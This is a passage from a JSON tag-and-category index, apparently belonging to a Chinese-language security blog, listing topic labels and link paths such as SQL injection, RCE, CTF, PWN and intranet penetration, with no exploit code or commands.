/"},{"name":"Apache-Cocoon-XML","slug":"Apache-Cocoon-XML","link":"/tags/Apache-Cocoon-XML/"},{"name":"Apache","slug":"Apache","link":"/tags/Apache/"},{"name":"Horde Groupware Webmail Edition","slug":"Horde-Groupware-Webmail-Edition","link":"/tags/Horde-Groupware-Webmail-Edition/"},{"name":"Pligg","slug":"Pligg","link":"/tags/Pligg/"},{"name":"sql注入","slug":"sql注入","link":"/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"天融信","slug":"天融信","link":"/tags/%E5%A4%A9%E8%9E%8D%E4%BF%A1/"},{"name":"PhpStudy","slug":"PhpStudy","link":"/tags/PhpStudy/"},{"name":"nginx解析漏洞","slug":"nginx解析漏洞","link":"/tags/nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"宝塔","slug":"宝塔","link":"/tags/%E5%AE%9D%E5%A1%94/"},{"name":"未授权访问漏洞","slug":"未授权访问漏洞","link":"/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"泛微OA","slug":"泛微OA","link":"/tags/%E6%B3%9B%E5%BE%AEOA/"},{"name":"绿盟","slug":"绿盟","link":"/tags/%E7%BB%BF%E7%9B%9F/"},{"name":"齐治堡垒机","slug":"齐治堡垒机","link":"/tags/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/"},{"name":"java反序列化","slug":"java反序列化","link":"/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Exchange-Server","slug":"Exchange-Server","link":"/tags/Exchange-Server/"},{"name":"VIM","slug":"VIM","link":"/tags/VIM/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"用友","slug":"用友","link":"/tags/%E7%94%A8%E5%8F%8B/"},{"name":"sangfor","slug":"sangfor","link":"/tags/sangfor/"},{"name":"VPN","slug":"VPN","link":"/tags/VPN/"},{"name":"EDR","slug":"EDR","link":"/tags/EDR/"},{"name":"通达OA","slug":"通达OA","link":"/tags/%E9%80%9A%E8%BE%BEOA/"},{"name":"360","slug":"360","link":"/tags/360/"},{"name":"Cisco","slug":"Cisco","link":"/tags/Cisco/"},{"name":"Huawei","slug":"Huawei","link":"/tags/Huawei/"},{"name":"Amazon","slug":"Amazon","link":"/tags/Amazon/"},{"name":"三星","slug":"三星","link":"/tags/%E4%B8%89%E6%98%9F/"},{"name":"XiaoMi","slug":"XiaoMi","link":"/tags/XiaoMi/"},{"name":"Frida","slug":"Frida","link":"/tags/Frida/"},{"name":"Hook","slug":"Hook","link":"/tags/Hook/"},{"name":"宏病毒","slug":"宏病毒","link":"/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"},{"name":"HTTP请求走私协议","slug":"HTTP请求走私协议","link":"/tags/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8D%8F%E8%AE%AE/"},{"name":"协议分析","slug":"协议分析","link":"/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"name":"堆","slug":"堆","link":"/tags/%E5%A0%86/"},{"name":"蓝牙","slug":"蓝牙","link":"/tags/%E8%93%9D%E7%89%99/"},{"name":"Google-Hacking","slug":"Google-Hacking","link":"/tags/Google-Hacking/"},{"name":"ZTE","slug":"ZTE","link":"/tags/ZTE/"},{"name":"JCG","slug":"JCG","link":"/tags/JCG/"},{"name":"DMA","slug":"DMA","link":"/tags/DMA/"},{"name":"Thunderbolt 3","slug":"Thunderbolt-3","link":"/tags/Thunderbolt-3/"},{"name":"SGX","slug":"SGX","link":"/tags/SGX/"},{"name":"Apple T2","slug":"Apple-T2","link":"/tags/Apple-T2/"},{"name":"ActiveMQ","slug":"ActiveMQ","link":"/tags/ActiveMQ/"},{"name":"crackme","slug":"crackme","link":"/tags/crackme/"},{"name":"struts2","slug":"struts2","link":"/tags/struts2/"},{"name":"SQLI-labs","slug":"SQLI-labs","link":"/tags/SQLI-labs/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"AppWeb","slug":"AppWeb","link":"/tags/AppWeb/"},{"name":"Pwn","slug":"Pwn","link":"/tags/Pwn/"},{"name":"icarus","slug":"icarus","link":"/tags/icarus/"},{"name":"Httpdecrypt","slug":"Httpdecrypt","link":"/tags/Httpdecrypt/"},{"name":"Apereo Cas","slug":"Apereo-Cas","link":"/tags/Apereo-Cas/"},{"name":"面试","slug":"面试","link":"/tags/%E9%9D%A2%E8%AF%95/"},{"name":"正则","slug":"正则","link":"/tags/%E6%AD%A3%E5%88%99/"},{"name":"adb","slug":"adb","link":"/tags/adb/"},{"name":"PineApple-Nano","slug":"PineApple-Nano","link":"/tags/PineApple-Nano/"},{"name":"kindeditor","slug":"kindeditor","link":"/tags/kindeditor/"},{"name":"Smartbi","slug":"Smartbi","link":"/tags/Smartbi/"},{"name":"Spring Boot","slug":"Spring-Boot","link":"/tags/Spring-Boot/"},{"name":"MCA","slug":"MCA","link":"/tags/MCA/"},{"name":"MCE","slug":"MCE","link":"/tags/MCE/"},{"name":"PHP反序列化","slug":"PHP反序列化","link":"/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"pwnable.kr","slug":"pwnable-kr","link":"/tags/pwnable-kr/"},{"name":"UAF","slug":"UAF","link":"/tags/UAF/"},{"name":"PWN","slug":"PWN","link":"/tags/PWN/"},{"name":"Glibc Heap","slug":"Glibc-Heap","link":"/tags/Glibc-Heap/"},{"name":"HWS","slug":"HWS","link":"/tags/HWS/"},{"name":"格式化字符串","slug":"格式化字符串","link":"/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"固件","slug":"固件","link":"/tags/%E5%9B%BA%E4%BB%B6/"},{"name":"unlink","slug":"unlink","link":"/tags/unlink/"},{"name":"Code_audit","slug":"Code-audit","link":"/tags/Code-audit/"},{"name":"WEB安全","slug":"WEB安全","link":"/tags/WEB%E5%AE%89%E5%85%A8/"},{"name":"小程序","slug":"小程序","link":"/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"Dict","slug":"Dict","link":"/tags/Dict/"}],"categories":[{"name":"IOT","slug":"IOT","link":"/categories/IOT/"},{"name":"环境配置","slug":"环境配置","link":"/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"路由器","slug":"路由器","link":"/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"WEB安全","slug":"WEB安全","link":"/categories/WEB%E5%AE%89%E5%85%A8/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"内网渗透","slug":"内网渗透","link":"/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"二进制安全","slug":"二进制安全","link":"/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"Android","slug":"Android","link":"/categories/Android/"},{"name":"PWN","slug":"PWN","link":"/categories/PWN/"}]}